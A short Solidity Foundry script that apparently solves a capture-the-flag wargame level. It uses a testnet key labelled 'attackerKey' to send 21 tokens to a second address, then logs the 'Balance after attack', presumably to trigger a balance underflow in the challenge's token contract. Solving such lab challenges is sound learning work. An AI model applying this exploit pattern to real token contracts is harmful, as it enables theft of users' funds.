// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}

contract TokenScript is Script {
    function run() external {
        IToken token = IToken(vm.envAddress("TOKEN_ADDRESS"));

        // Some amount of tokens were alloted to TESTNET_PRIVATE_KEY_1
        uint256 attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        // Address to hacked transfer token
        address attacker2 = vm.envAddress("TESTNET_ADDRESS_2");

        vm.startBroadcast(attackerKey);
        token.transfer(attacker2, 21);
        console.log(
            "Balance after attack : ",
            token.balanceOf(vm.envAddress("TESTNET_ADDRESS_1"))
        );
        vm.stopBroadcast();
        console.log("SUCCESS!!! Submit the instance.");
    }
}
